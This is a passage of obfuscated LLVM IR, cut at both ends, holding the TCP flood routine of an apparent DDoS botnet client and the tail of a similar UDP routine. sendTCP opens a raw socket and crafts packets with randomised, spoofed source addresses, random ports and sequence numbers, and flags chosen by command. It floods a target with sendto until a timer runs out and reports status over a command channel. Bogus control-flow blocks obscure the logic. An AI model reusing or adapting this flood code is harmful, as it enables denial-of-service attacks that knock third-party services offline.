  %428 = icmp slt i32 %423, 10
  %429 = or i1 %427, %428
  br i1 %429, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %421
  %430 = load i32, i32* @x.73
  %431 = load i32, i32* @y.74
  %432 = sub i32 %430, 1
  %433 = mul i32 %430, %432
  %434 = urem i32 %433, 2
  %435 = icmp eq i32 %434, 0
  %436 = icmp slt i32 %431, 10
  %437 = or i1 %435, %436
  br i1 %437, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %6
  %438 = alloca i8*, align 8
  %439 = alloca i32, align 4
  %440 = alloca i32, align 4
  %441 = alloca i32, align 4
  %442 = alloca i32, align 4
  %443 = alloca i32, align 4
  %444 = alloca %struct.sockaddr_in, align 4
  %445 = alloca i32, align 4
  %446 = alloca i32, align 4
  %447 = alloca i8*, align 8
  %448 = alloca i32, align 4
  %449 = alloca i32, align 4
  %450 = alloca i32, align 4
  %451 = alloca i32, align 4
  %452 = alloca i32, align 4
  %453 = alloca i32, align 4
  %454 = alloca i8*, align 8
  %455 = alloca %struct.iphdr*, align 8
  %456 = alloca %struct.udphdr*, align 8
  %457 = alloca i32, align 4
  %458 = alloca i32, align 4
  store i8* %0, i8** %438, align 8
  store i32 %1, i32* %439, align 4
  store i32 %2, i32* %440, align 4
  store i32 %3, i32* %441, align 4
  store i32 %4, i32* %442, align 4
  store i32 %5, i32* %443, align 4
  %459 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %444, i32 0, i32 0
  store i16 2, i16* %459, align 4
  %460 = load i32, i32* %439, align 4
  %461 = icmp eq i32 %460, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  %462 = call i32 @rand_cmwc()
  %463 = trunc i32 %462 to i16
  %464 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %463, i16* %464, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %121
  %465 = load i32, i32* %16, align 4
  %466 = icmp eq i32 %465, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %140
  %467 = call i32 @rand_cmwc()
  %468 = trunc i32 %467 to i16
  %469 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %468, i16* %469, align 2
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %170
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %194
  store i32 1, i32* %28, align 4
  %470 = load i32, i32* %27, align 4
  %471 = bitcast i32* %28 to i8*
  %472 = call i32 @setsockopt(i32 %470, i32 0, i32 3, i8* %471, i32 4) #2
  %473 = icmp slt i32 %472, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %314
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %377
  %474 = call i64 @time(i64* null) #2
  %475 = load i32, i32* %34, align 4
  %476 = sext i32 %475 to i64
  %477 = icmp sgt i64 %474, %476
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %399
  store i32 0, i32* %35, align 4
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %421
  br label %originalBB34
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = load i32, i32* @x.75
  %9 = load i32, i32* @y.76
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.sockaddr_in, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %16, align 8
  store i32 %1, i32* %17, align 4
  store i32 %2, i32* %18, align 4
  store i32 %3, i32* %19, align 4
  store i8* %4, i8** %20, align 8
  store i32 %5, i32* %21, align 4
  store i32 %6, i32* %22, align 4
  %34 = load i32, i32* %22, align 4
  store i32 %34, i32* %23, align 4
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %35, align 4
  %36 = load i32, i32* %17, align 4
  %37 = icmp eq i32 %36, 0
  %38 = load i32, i32* @x.75
  %39 = load i32, i32* @y.76
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %37, label %46, label %50

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = call i32 @rand_cmwc()
  %48 = trunc i32 %47 to i16
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %48, i16* %49, align 2
  br label %55

; <label>:50:                                     ; preds = %originalBBpart2
  %51 = load i32, i32* %17, align 4
  %52 = trunc i32 %51 to i16
  %53 = call zeroext i16 @htons(i16 zeroext %52) #13
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %53, i16* %54, align 2
  br label %55

; <label>:55:                                     ; preds = %50, %46
  %56 = load i8*, i8** %16, align 8
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %58 = call i32 @getHost(i8* %56, %struct.in_addr* %57)
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %61

; <label>:60:                                     ; preds = %55
  br label %470

; <label>:61:                                     ; preds = %55
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 3
  %63 = getelementptr inbounds [8 x i8], [8 x i8]* %62, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %63, i8 0, i64 8, i32 4, i1 false)
  %64 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %64, i32* %25, align 4
  %65 = load i32, i32* %25, align 4
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %70, label %67

; <label>:67:                                     ; preds = %61
  %68 = load i32, i32* @mainCommSock, align 4
  %69 = call i32 (i32, i8*, ...) @sockprintf(i32 %68, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i32 0, i32 0))
  br label %470

; <label>:70:                                     ; preds = %61
  store i32 1, i32* %26, align 4
  %71 = load i32, i32* %25, align 4
  %72 = bitcast i32* %26 to i8*
  %73 = call i32 @setsockopt(i32 %71, i32 0, i32 3, i8* %72, i32 4) #2
  %74 = icmp slt i32 %73, 0
  br i1 %74, label %75, label %94

; <label>:75:                                     ; preds = %70
  %76 = load i32, i32* @x.75
  %77 = load i32, i32* @y.76
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %75
  %84 = load i32, i32* @mainCommSock, align 4
  %85 = call i32 (i32, i8*, ...) @sockprintf(i32 %84, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.83, i32 0, i32 0))
  %86 = load i32, i32* @x.75
  %87 = load i32, i32* @y.76
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %470

; <label>:94:                                     ; preds = %70
  %95 = load i32, i32* %19, align 4
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %94
  store i32 0, i32* %27, align 4
  br label %104

; <label>:98:                                     ; preds = %94
  %99 = load i32, i32* %19, align 4
  %100 = sub nsw i32 32, %99
  %101 = shl i32 1, %100
  %102 = sub nsw i32 %101, 1
  %103 = xor i32 %102, -1
  store i32 %103, i32* %27, align 4
  br label %104

; <label>:104:                                    ; preds = %98, %97
  %105 = load i32, i32* %21, align 4
  %106 = sext i32 %105 to i64
  %107 = add i64 40, %106
  %108 = call i8* @llvm.stacksave()
  store i8* %108, i8** %28, align 8
  %109 = alloca i8, i64 %107, align 16
  %110 = bitcast i8* %109 to %struct.iphdr*
  store %struct.iphdr* %110, %struct.iphdr** %29, align 8
  %111 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %112 = bitcast %struct.iphdr* %111 to i8*
  %113 = getelementptr i8, i8* %112, i64 20
  %114 = bitcast i8* %113 to %struct.tcphdr*
  store %struct.tcphdr* %114, %struct.tcphdr** %30, align 8
  %115 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %116 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %117 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %116, i32 0, i32 0
  %118 = load i32, i32* %117, align 4
  %119 = load i32, i32* %27, align 4
  %120 = call i32 @getRandomIP(i32 %119)
  %121 = call i32 @htonl(i32 %120) #13
  %122 = load i32, i32* %21, align 4
  %123 = sext i32 %122 to i64
  %124 = add i64 20, %123
  %125 = trunc i64 %124 to i32
  call void @makeIPPacket(%struct.iphdr* %115, i32 %118, i32 %121, i8 zeroext 6, i32 %125)
  %126 = call i32 @rand_cmwc()
  %127 = trunc i32 %126 to i16
  %128 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i32 0, i32 0
  %130 = bitcast %union.anon.0* %129 to %struct.anon.1*
  %131 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %130, i32 0, i32 0
  store i16 %127, i16* %131, align 4
  %132 = call i32 @rand_cmwc()
  %133 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %134 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %133, i32 0, i32 0
  %135 = bitcast %union.anon.0* %134 to %struct.anon.1*
  %136 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %135, i32 0, i32 2
  store i32 %132, i32* %136, align 4
  %137 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %138 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %137, i32 0, i32 0
  %139 = bitcast %union.anon.0* %138 to %struct.anon.1*
  %140 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %139, i32 0, i32 3
  store i32 0, i32* %140, align 4
  %141 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i32 0, i32 0
  %143 = bitcast %union.anon.0* %142 to %struct.anon.1*
  %144 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %143, i32 0, i32 4
  %145 = load i16, i16* %144, align 4
  %146 = and i16 %145, -241
  %147 = or i16 %146, 80
  store i16 %147, i16* %144, align 4
  %148 = load i8*, i8** %20, align 8
  %149 = call i32 @strcmp(i8* %148, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i32 0, i32 0)) #10
  %150 = icmp ne i32 %149, 0
  br i1 %150, label %203, label %151

; <label>:151:                                    ; preds = %104
  %152 = load i32, i32* @x.75
  %153 = load i32, i32* @y.76
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %151
  %160 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %161 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %160, i32 0, i32 0
  %162 = bitcast %union.anon.0* %161 to %struct.anon.1*
  %163 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %162, i32 0, i32 4
  %164 = load i16, i16* %163, align 4
  %165 = and i16 %164, -513
  %166 = or i16 %165, 512
  store i16 %166, i16* %163, align 4
  %167 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %168 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %167, i32 0, i32 0
  %169 = bitcast %union.anon.0* %168 to %struct.anon.1*
  %170 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %169, i32 0, i32 4
  %171 = load i16, i16* %170, align 4
  %172 = and i16 %171, -1025
  %173 = or i16 %172, 1024
  store i16 %173, i16* %170, align 4
  %174 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 0
  %176 = bitcast %union.anon.0* %175 to %struct.anon.1*
  %177 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %176, i32 0, i32 4
  %178 = load i16, i16* %177, align 4
  %179 = and i16 %178, -257
  %180 = or i16 %179, 256
  store i16 %180, i16* %177, align 4
  %181 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %182 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %181, i32 0, i32 0
  %183 = bitcast %union.anon.0* %182 to %struct.anon.1*
  %184 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %183, i32 0, i32 4
  %185 = load i16, i16* %184, align 4
  %186 = and i16 %185, -4097
  %187 = or i16 %186, 4096
  store i16 %187, i16* %184, align 4
  %188 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 0
  %190 = bitcast %union.anon.0* %189 to %struct.anon.1*
  %191 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %190, i32 0, i32 4
  %192 = load i16, i16* %191, align 4
  %193 = and i16 %192, -2049
  %194 = or i16 %193, 2048
  store i16 %194, i16* %191, align 4
  %195 = load i32, i32* @x.75
  %196 = load i32, i32* @y.76
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBBpart294, label %originalBB6alteredBB

originalBBpart294:                                ; preds = %originalBB6
  br label %312

; <label>:203:                                    ; preds = %104
  %204 = load i8*, i8** %20, align 8
  %205 = call i8* @strtok(i8* %204, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %205, i8** %31, align 8
  br label %206

; <label>:206:                                    ; preds = %309, %203
  %207 = load i8*, i8** %31, align 8
  %208 = icmp ne i8* %207, null
  br i1 %208, label %209, label %311

; <label>:209:                                    ; preds = %206
  %210 = load i8*, i8** %31, align 8
  %211 = call i32 @strcmp(i8* %210, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i32 0, i32 0)) #10
  %212 = icmp ne i32 %211, 0
  br i1 %212, label %237, label %213

; <label>:213:                                    ; preds = %209
  %214 = load i32, i32* @x.75
  %215 = load i32, i32* @y.76
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %213
  %222 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 0
  %224 = bitcast %union.anon.0* %223 to %struct.anon.1*
  %225 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %224, i32 0, i32 4
  %226 = load i16, i16* %225, align 4
  %227 = and i16 %226, -513
  %228 = or i16 %227, 512
  store i16 %228, i16* %225, align 4
  %229 = load i32, i32* @x.75
  %230 = load i32, i32* @y.76
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBBpart2108, label %originalBB96alteredBB

originalBBpart2108:                               ; preds = %originalBB96
  br label %309

; <label>:237:                                    ; preds = %209
  %238 = load i8*, i8** %31, align 8
  %239 = call i32 @strcmp(i8* %238, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i32 0, i32 0)) #10
  %240 = icmp ne i32 %239, 0
  br i1 %240, label %249, label %241

; <label>:241:                                    ; preds = %237
  %242 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %243 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %242, i32 0, i32 0
  %244 = bitcast %union.anon.0* %243 to %struct.anon.1*
  %245 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %246, -1025
  %248 = or i16 %247, 1024
  store i16 %248, i16* %245, align 4
  br label %308

; <label>:249:                                    ; preds = %237
  %250 = load i8*, i8** %31, align 8
  %251 = call i32 @strcmp(i8* %250, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.88, i32 0, i32 0)) #10
  %252 = icmp ne i32 %251, 0
  br i1 %252, label %261, label %253

; <label>:253:                                    ; preds = %249
  %254 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 0
  %256 = bitcast %union.anon.0* %255 to %struct.anon.1*
  %257 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %256, i32 0, i32 4
  %258 = load i16, i16* %257, align 4
  %259 = and i16 %258, -257
  %260 = or i16 %259, 256
  store i16 %260, i16* %257, align 4
  br label %307

; <label>:261:                                    ; preds = %249
  %262 = load i8*, i8** %31, align 8
  %263 = call i32 @strcmp(i8* %262, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i32 0, i32 0)) #10
  %264 = icmp ne i32 %263, 0
  br i1 %264, label %289, label %265

; <label>:265:                                    ; preds = %261
  %266 = load i32, i32* @x.75
  %267 = load i32, i32* @y.76
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %265
  %274 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %275 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %274, i32 0, i32 0
  %276 = bitcast %union.anon.0* %275 to %struct.anon.1*
  %277 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %276, i32 0, i32 4
  %278 = load i16, i16* %277, align 4
  %279 = and i16 %278, -4097
  %280 = or i16 %279, 4096
  store i16 %280, i16* %277, align 4
  %281 = load i32, i32* @x.75
  %282 = load i32, i32* @y.76
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBBpart2127, label %originalBB110alteredBB

originalBBpart2127:                               ; preds = %originalBB110
  br label %306

; <label>:289:                                    ; preds = %261
  %290 = load i8*, i8** %31, align 8
  %291 = call i32 @strcmp(i8* %290, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.90, i32 0, i32 0)) #10
  %292 = icmp ne i32 %291, 0
  br i1 %292, label %301, label %293

; <label>:293:                                    ; preds = %289
  %294 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %295 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %294, i32 0, i32 0
  %296 = bitcast %union.anon.0* %295 to %struct.anon.1*
  %297 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %296, i32 0, i32 4
  %298 = load i16, i16* %297, align 4
  %299 = and i16 %298, -2049
  %300 = or i16 %299, 2048
  store i16 %300, i16* %297, align 4
  br label %305

; <label>:301:                                    ; preds = %289
  %302 = load i32, i32* @mainCommSock, align 4
  %303 = load i8*, i8** %31, align 8
  %304 = call i32 (i32, i8*, ...) @sockprintf(i32 %302, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.91, i32 0, i32 0), i8* %303)
  br label %305

; <label>:305:                                    ; preds = %301, %293
  br label %306

; <label>:306:                                    ; preds = %305, %originalBBpart2127
  br label %307

; <label>:307:                                    ; preds = %306, %253
  br label %308

; <label>:308:                                    ; preds = %307, %241
  br label %309

; <label>:309:                                    ; preds = %308, %originalBBpart2108
  %310 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %310, i8** %31, align 8
  br label %206

; <label>:311:                                    ; preds = %206
  br label %312

; <label>:312:                                    ; preds = %311, %originalBBpart294
  %313 = load i32, i32* @x.75
  %314 = load i32, i32* @y.76
  %315 = sub i32 %313, 1
  %316 = mul i32 %313, %315
  %317 = urem i32 %316, 2
  %318 = icmp eq i32 %317, 0
  %319 = icmp slt i32 %314, 10
  %320 = or i1 %318, %319
  br i1 %320, label %originalBB129, label %originalBB129alteredBB

originalBB129:                                    ; preds = %originalBB129alteredBB, %312
  %321 = call i32 @rand_cmwc()
  %322 = trunc i32 %321 to i16
  %323 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %324 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %323, i32 0, i32 0
  %325 = bitcast %union.anon.0* %324 to %struct.anon.1*
  %326 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %325, i32 0, i32 5
  store i16 %322, i16* %326, align 2
  %327 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %328 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %327, i32 0, i32 0
  %329 = bitcast %union.anon.0* %328 to %struct.anon.1*
  %330 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %329, i32 0, i32 6
  store i16 0, i16* %330, align 4
  %331 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %332 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %331, i32 0, i32 0
  %333 = bitcast %union.anon.0* %332 to %struct.anon.1*
  %334 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %333, i32 0, i32 7
  store i16 0, i16* %334, align 2
  %335 = load i32, i32* %17, align 4
  %336 = icmp eq i32 %335, 0
  %337 = load i32, i32* @x.75
  %338 = load i32, i32* @y.76
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBBpart2131, label %originalBB129alteredBB

originalBBpart2131:                               ; preds = %originalBB129
  br i1 %336, label %345, label %363

; <label>:345:                                    ; preds = %originalBBpart2131
  %346 = load i32, i32* @x.75
  %347 = load i32, i32* @y.76
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBB133, label %originalBB133alteredBB

originalBB133:                                    ; preds = %originalBB133alteredBB, %345
  %354 = call i32 @rand_cmwc()
  %355 = load i32, i32* @x.75
  %356 = load i32, i32* @y.76
  %357 = sub i32 %355, 1
  %358 = mul i32 %355, %357
  %359 = urem i32 %358, 2
  %360 = icmp eq i32 %359, 0
  %361 = icmp slt i32 %356, 10
  %362 = or i1 %360, %361
  br i1 %362, label %originalBBpart2135, label %originalBB133alteredBB

originalBBpart2135:                               ; preds = %originalBB133
  br label %368

; <label>:363:                                    ; preds = %originalBBpart2131
  %364 = load i32, i32* %17, align 4
  %365 = trunc i32 %364 to i16
  %366 = call zeroext i16 @htons(i16 zeroext %365) #13
  %367 = zext i16 %366 to i32
  br label %368

; <label>:368:                                    ; preds = %363, %originalBBpart2135
  %369 = phi i32 [ %354, %originalBBpart2135 ], [ %367, %363 ]
  %370 = trunc i32 %369 to i16
  %371 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %372 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %371, i32 0, i32 0
  %373 = bitcast %union.anon.0* %372 to %struct.anon.1*
  %374 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %373, i32 0, i32 1
  store i16 %370, i16* %374, align 2
  %375 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %376 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %377 = call zeroext i16 @tcpcsum(%struct.iphdr* %375, %struct.tcphdr* %376)
  %378 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %379 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %378, i32 0, i32 0
  %380 = bitcast %union.anon.0* %379 to %struct.anon.1*
  %381 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %380, i32 0, i32 6
  store i16 %377, i16* %381, align 4
  %382 = bitcast i8* %109 to i16*
  %383 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %384 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %383, i32 0, i32 2
  %385 = load i16, i16* %384, align 2
  %386 = zext i16 %385 to i32
  %387 = call zeroext i16 @csum(i16* %382, i32 %386)
  %388 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %389 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %388, i32 0, i32 7
  store i16 %387, i16* %389, align 2
  %390 = call i64 @time(i64* null) #2
  %391 = load i32, i32* %18, align 4
  %392 = sext i32 %391 to i64
  %393 = add nsw i64 %390, %392
  %394 = trunc i64 %393 to i32
  store i32 %394, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %395

; <label>:395:                                    ; preds = %465, %464, %368
  br label %396

; <label>:396:                                    ; preds = %395
  %397 = load i32, i32* %25, align 4
  %398 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  %399 = call i64 @sendto(i32 %397, i8* %109, i64 %107, i32 0, %struct.sockaddr* %398, i32 16)
  %400 = load i32, i32* %27, align 4
  %401 = call i32 @getRandomIP(i32 %400)
  %402 = call i32 @htonl(i32 %401) #13
  %403 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %404 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %403, i32 0, i32 8
  store i32 %402, i32* %404, align 4
  %405 = call i32 @rand_cmwc()
  %406 = trunc i32 %405 to i16
  %407 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 3
  store i16 %406, i16* %408, align 4
  %409 = call i32 @rand_cmwc()
  %410 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 0
  %412 = bitcast %union.anon.0* %411 to %struct.anon.1*
  %413 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %412, i32 0, i32 2
  store i32 %409, i32* %413, align 4
  %414 = call i32 @rand_cmwc()
  %415 = trunc i32 %414 to i16
  %416 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 0
  %418 = bitcast %union.anon.0* %417 to %struct.anon.1*
  %419 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %418, i32 0, i32 0
  store i16 %415, i16* %419, align 4
  %420 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %421 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %420, i32 0, i32 0
  %422 = bitcast %union.anon.0* %421 to %struct.anon.1*
  %423 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %422, i32 0, i32 6
  store i16 0, i16* %423, align 4
  %424 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %425 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %426 = call zeroext i16 @tcpcsum(%struct.iphdr* %424, %struct.tcphdr* %425)
  %427 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %428 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %427, i32 0, i32 0
  %429 = bitcast %union.anon.0* %428 to %struct.anon.1*
  %430 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %429, i32 0, i32 6
  store i16 %426, i16* %430, align 4
  %431 = bitcast i8* %109 to i16*
  %432 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %433 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %432, i32 0, i32 2
